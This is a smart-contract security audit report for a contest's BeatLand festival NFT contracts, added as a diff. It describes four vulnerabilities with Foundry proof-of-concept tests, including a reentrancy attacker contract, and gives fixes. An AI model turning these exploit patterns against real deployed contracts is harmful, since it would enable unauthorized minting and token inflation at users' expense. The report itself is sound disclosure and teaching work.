@@ -1,0 +1,365 @@
+# 🔐 Security Audit Report — BeatLand Festival
+
+**AI First Flight #4 | CodeHawks**
+
+| | |
+|---|---|
+| Auditor | Independent AI Audit (Claude + Pashov Skills) |
+| Contest | AI First Flight #4 — BeatLand Festival |
+| Audit Period | April 19–21, 2026 |
+| Contest Result | 3 / 4 H/M findings matched · 100 EXP earned |
+| Severity Distribution | 1 High · 3 Medium |
+| Tooling | x-ray (pre-audit scan) · solidity-auditor (8-agent parallel analysis) |
+
+---
+
+## Scope
+
+| | |
+|---|---|
+| Files Reviewed | src/BeatToken.sol · src/FestivalPass.sol · src/Interfaces/IFestivalPass.sol |
+| nSLOC | 237 (BeatToken: 20 · FestivalPass: 217) |
+| Solidity Version | 0.8.25 |
+| Framework | Foundry |
+| Token Standards | ERC1155 (passes + memorabilia) · ERC20 (BEAT reward token) |
+
+---
+
+## Protocol Overview
+
+BeatLand is a festival NFT ecosystem on Ethereum. Users purchase tiered ERC1155 passes (GENERAL / VIP / BACKSTAGE), attend virtual performances to earn BEAT ERC20 tokens, and redeem unique memorabilia NFTs by burning BEAT tokens. A single FestivalPass contract handles both pass NFTs (token IDs 1–3) and memorabilia NFTs (IDs encoded as `collectionId << 128 + itemId`).
+
+---
+
+## Findings Summary
+
+| ID | Title | Severity | Status |
+|---|---|---|---|
+| H-01 | ERC1155 Pass Transfer Bypasses Per-Address Attendance Tracking, Enabling Unlimited BEAT Farming | High | ✅ Matched |
+| M-01 | configurePass Resets passSupply to Zero, Allowing Minting Beyond maxSupply | Medium | ✅ Matched |
+| M-02 | buyPass Lacks Reentrancy Protection, Allowing Minting Beyond Maximum Pass Supply | Medium | ❌ Missed |
+| M-03 | Off-by-One in redeemMemorabilia Permanently Locks the Last NFT in Every Collection | Medium | ✅ Matched |
+
+---
+
+## Detailed Findings
+
+---
+
+### [High] ERC1155 Pass Transfer Bypasses Per-Address Attendance Tracking, Enabling Unlimited BEAT Farming
+
+**Affected Files:** src/FestivalPass.sol
+
+**Description**
+
+Users purchase ERC1155 festival passes and earn BEAT tokens by calling `attendPerformance`. Two guards prevent double-claiming: `hasAttended[performanceId][msg.sender]` blocks re-attendance, and `lastCheckIn[msg.sender]` enforces a 1-hour cooldown. Both guards are tracked per caller address, not per pass token. ERC1155 passes are freely transferable. After attending, a user can transfer their pass to a fresh wallet — that wallet has `hasAttended == false` and `lastCheckIn == 0`, bypassing both guards immediately.
+
+```solidity
+function attendPerformance(uint256 performanceId) external {
+    require(isPerformanceActive(performanceId), "Performance is not active");
+    require(hasPass(msg.sender), "Must own a pass");
+@>  require(!hasAttended[performanceId][msg.sender], "Already attended this performance");
+@>  require(block.timestamp >= lastCheckIn[msg.sender] + COOLDOWN, "Cooldown period not met");
+    // Both checks are per-address — a fresh wallet bypasses them immediately
+
+    hasAttended[performanceId][msg.sender] = true;
+    lastCheckIn[msg.sender] = block.timestamp;
+
+    uint256 multiplier = getMultiplier(msg.sender);
+    BeatToken(beatToken).mint(msg.sender, performances[performanceId].baseReward * multiplier);
+}
+```
+
+**Risk**
+
+- Executing this attack requires only a `safeTransferFrom` call and a second funded wallet.
+- A BACKSTAGE pass (3× multiplier) costs 0.25 ETH. With 10 wallets, an attacker earns 10 × baseReward × 3 BEAT from a single pass purchase.
+
+**Impact**
+
+- BEAT token supply becomes unbounded from a single pass purchase, undermining token scarcity and memorabilia pricing.
+- Legitimate attendees cannot accumulate enough BEAT to redeem memorabilia as attackers drain performance rewards.
+
+**Proof of Concept**
+
+```solidity
+function test_PassTransferFarming() public {
+    address alice = makeAddr("alice");
+    address bob   = makeAddr("bob");
+    vm.deal(alice, 1 ether);
+
+    vm.prank(alice);
+    festivalPass.buyPass{value: 0.25 ether}(3);
+
+    vm.prank(organizer);
+    uint256 perfId = festivalPass.createPerformance(
+        block.timestamp + 1 hours, 4 hours, 100e18
+    );
+    vm.warp(block.timestamp + 90 minutes);
+
+    vm.prank(alice);
+    festivalPass.attendPerformance(perfId);
+    assertEq(beatToken.balanceOf(alice), 15e18 + 300e18);
+
+    // Alice transfers pass to Bob — both guards reset to zero
+    vm.prank(alice);
+    festivalPass.safeTransferFrom(alice, bob, 3, 1, "");
+
+    // Bob attends the SAME performance — succeeds
+    vm.prank(bob);
+    festivalPass.attendPerformance(perfId);
+    assertEq(beatToken.balanceOf(bob), 300e18);
+    // One pass → 600e18 BEAT. Repeat with N wallets for N × 300e18.
+}
+```
+
+**Recommended Mitigation**
+
+```diff
++ function safeTransferFrom(
++     address from, address to, uint256 id, uint256 amount, bytes memory data
++ ) public override {
++     require(id > BACKSTAGE_PASS, "Festival passes are non-transferable");
++     super.safeTransferFrom(from, to, id, amount, data);
++ }
++
++ function safeBatchTransferFrom(
++     address from, address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data
++ ) public override {
++     for (uint256 i = 0; i < ids.length; i++) {
++         require(ids[i] > BACKSTAGE_PASS, "Festival passes are non-transferable");
++     }
++     super.safeBatchTransferFrom(from, to, ids, amounts, data);
++ }
+```
+
+---
+
+### [Medium] configurePass Resets passSupply to Zero, Allowing Minting Beyond maxSupply
+
+**Affected Files:** src/FestivalPass.sol · src/Interfaces/IFestivalPass.sol
+
+**Description**
+
+`configurePass` allows the organizer to update a pass tier's price and maximum supply. Every call unconditionally executes `passSupply[passId] = 0`, resetting the minted counter regardless of how many passes are already in circulation. A routine price update after passes are sold inadvertently reopens the full quota.
+
+```solidity
+function configurePass(uint256 passId, uint256 price, uint256 maxSupply) external onlyOrganizer {
+    require(passId == GENERAL_PASS || passId == VIP_PASS || passId == BACKSTAGE_PASS, "Invalid pass ID");
+    require(price > 0, "Price must be greater than 0");
+    require(maxSupply > 0, "Max supply must be greater than 0");
+    passPrice[passId] = price;
+    passMaxSupply[passId] = maxSupply;
+@>  passSupply[passId] = 0; // always executes — resets even with live circulating passes
+}
+```
+
+**Impact**
+
+- Total circulating passes can grow to any multiple of `maxSupply` with each reconfigure-and-resell cycle, breaking the scarcity guarantee.
+- Each re-opened BACKSTAGE tier yields an additional 15e18 BEAT welcome bonus per new buyer, compounding token inflation.
+
+**Proof of Concept**
+
+```solidity
+function test_ConfigurePassSupplyReset() public {
+    vm.prank(organizer);
+    festivalPass.configurePass(1, 0.05 ether, 2);
+
+    vm.prank(user1);
+    festivalPass.buyPass{value: 0.05 ether}(1);
+    vm.prank(user2);
+    festivalPass.buyPass{value: 0.05 ether}(1);
+
+    // Third purchase correctly reverts
+    address user3 = makeAddr("user3");
+    vm.deal(user3, 1 ether);
+    vm.prank(user3);
+    vm.expectRevert("Max supply reached");
+    festivalPass.buyPass{value: 0.05 ether}(1);
+
+    // Organizer updates price → passSupply[1] silently reset to 0
+    vm.prank(organizer);
+    festivalPass.configurePass(1, 0.06 ether, 2);
+
+    // Third purchase now succeeds — 3 passes exist against a cap of 2
+    vm.prank(user3);
+    festivalPass.buyPass{value: 0.06 ether}(1);
+    assertEq(festivalPass.passSupply(1), 1); // counter says 1, but 3 tokens exist
+}
+```
+
+**Recommended Mitigation**
+
+```diff
++ require(passSupply[passId] == 0, "Cannot reconfigure pass with existing supply");
+  passPrice[passId] = price;
+  passMaxSupply[passId] = maxSupply;
+- passSupply[passId] = 0;
+```
+
+---
+
+### [Medium] buyPass Lacks Reentrancy Protection, Allowing Minting Beyond Maximum Pass Supply
+
+**Affected Files:** src/FestivalPass.sol
+
+**Description**
+
+`buyPass` violates the Checks-Effects-Interactions pattern: `_mint` is called before `++passSupply`. ERC1155's `_mint` triggers `onERC1155Received` on any contract recipient. An attacker contract can call `buyPass` again from inside `onERC1155Received` — at that moment `passSupply` has not yet been incremented, so the supply check passes again, minting additional passes beyond the cap.
+
+```solidity
+function buyPass(uint256 collectionId) external payable {
+    require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS);
+    require(msg.value == passPrice[collectionId], "Incorrect payment amount");
+@>  require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
+    // passSupply is NOT updated until after the mint below
+
+@>  _mint(msg.sender, collectionId, 1, ""); // triggers onERC1155Received — passSupply still stale
+@>  ++passSupply[collectionId];              // CEI violated: state update after external call
+    ...
+}
+```
+
+**Impact**
+
+- The hard supply cap for all three tiers is bypassable, breaking scarcity for legitimate buyers.
+- Each extra BACKSTAGE pass minted through reentrancy triggers an additional 15e18 BEAT welcome bonus.
+
+**Proof of Concept**
+
+```solidity
+contract ReentrancyAttacker {
+    FestivalPass public festivalPass;
+    uint256 public passId;
+    uint256 public price;
+    uint256 public depth;
+
+    constructor(address _festivalPass, uint256 _passId, uint256 _price) {
+        festivalPass = FestivalPass(_festivalPass);
+        passId = _passId;
+        price = _price;
+    }
+
+    function attack(uint256 _depth) external payable {
+        depth = _depth;
+        festivalPass.buyPass{value: price}(passId);
+    }
+
+    function onERC1155Received(
+        address, address, uint256, uint256, bytes memory
+    ) external returns (bytes4) {
+        if (depth > 0 && address(this).balance >= price) {
+            depth--;
+            festivalPass.buyPass{value: price}(passId); // passSupply unchanged — passes again
+        }
+        return this.onERC1155Received.selector;
+    }
+
+    receive() external payable {}
+}
+
+function test_BuyPassReentrancy() public {
+    vm.prank(organizer);
+    festivalPass.configurePass(3, 0.25 ether, 3);
+
+    ReentrancyAttacker attacker = new ReentrancyAttacker(address(festivalPass), 3, 0.25 ether);
+    vm.deal(address(attacker), 0.75 ether);
+
+    attacker.attack(2); // re-enters twice — 3 total mints
+
+    assertEq(festivalPass.balanceOf(address(attacker), 3), 3);
+    assertEq(beatToken.balanceOf(address(attacker)), 45e18); // 3 × 15e18 bonus
+}
+```
+
+**Recommended Mitigation**
+
+```diff
+  function buyPass(uint256 collectionId) external payable {
+      require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS);
+      require(msg.value == passPrice[collectionId], "Incorrect payment amount");
+      require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
+
++     ++passSupply[collectionId]; // effect before interaction
+
+      _mint(msg.sender, collectionId, 1, "");
+
+-     ++passSupply[collectionId];
+      ...
+  }
+```
+
+---
+
+### [Medium] Off-by-One in redeemMemorabilia Permanently Locks the Last NFT in Every Collection
+
+**Affected Files:** src/FestivalPass.sol · src/Interfaces/IFestivalPass.sol
+
+**Description**
+
+The sold-out guard uses strict less-than (`currentItemId < maxSupply`). After `maxSupply - 1` redemptions, `currentItemId` equals `maxSupply`, and the check `maxSupply < maxSupply` permanently blocks the final edition. For a collection with `maxSupply = 1`, the check `1 < 1` fails on the very first call, making the entire collection unmintable.
+
+```solidity
+function redeemMemorabilia(uint256 collectionId) external {
+    MemorabiliaCollection storage collection = collections[collectionId];
+    require(collection.priceInBeat > 0, "Collection does not exist");
+    require(collection.isActive, "Collection not active");
+@>  require(collection.currentItemId < collection.maxSupply, "Collection sold out");
+    //      ↑ strict less-than — last item permanently locked when currentItemId == maxSupply
+
+    BeatToken(beatToken).burnFrom(msg.sender, collection.priceInBeat);
+
+@>  uint256 itemId = collection.currentItemId++;
+    uint256 tokenId = encodeTokenId(collectionId, itemId);
+    _mint(msg.sender, tokenId, 1, "");
+}
+```
+
+**Impact**
+
+- Every collection permanently under-delivers by one NFT — "100 limited editions" can only sell 99.
+- For `maxSupply = 1`, zero NFTs are ever mintable — the collection is completely dead.
+
+**Proof of Concept**
+
+```solidity
+function test_LastNFTNeverMintable() public {
+    vm.prank(organizer);
+    uint256 colId = festivalPass.createMemorabiliaCollection(
+        "Limited Series", "ipfs://Qm", 10e18, 3, true
+    );
+
+    vm.prank(address(festivalPass));
+    beatToken.mint(user1, 100e18);
+
+    vm.startPrank(user1);
+    festivalPass.redeemMemorabilia(colId); // item 1 — OK
+    festivalPass.redeemMemorabilia(colId); // item 2 — OK
+
+    vm.expectRevert("Collection sold out"); // 3 < 3 = false
+    festivalPass.redeemMemorabilia(colId); // item 3 — permanently locked
+    vm.stopPrank();
+}
+```
+
+**Recommended Mitigation**
+
+```diff
+- require(collection.currentItemId < collection.maxSupply, "Collection sold out");
++ require(collection.currentItemId <= collection.maxSupply, "Collection sold out");
+```
+
+---
+
+## Audit Summary
+
+| Metric | Value |
+|---|---|
+| Total H/M findings | 4 |
+| Matched H/M | 3 / 4 (75%) |
+| False positives | 4 (FFI test, .transfer() DoS, global cooldown, view loop DoS) |
+| Missed H/M | 1 (ERC1155 _mint reentrancy in buyPass) |
+| EXP earned | 100 |
+
+**Key lesson:** Any `_mint` or `_safeMint` call that precedes a supply counter increment is a reentrancy risk via `onERC1155Received` / `onERC721Received`. The attacker contract can call back into payable functions using its own balance — do not assume callbacks cannot carry value. Always apply strict CEI: increment supply counters before minting.
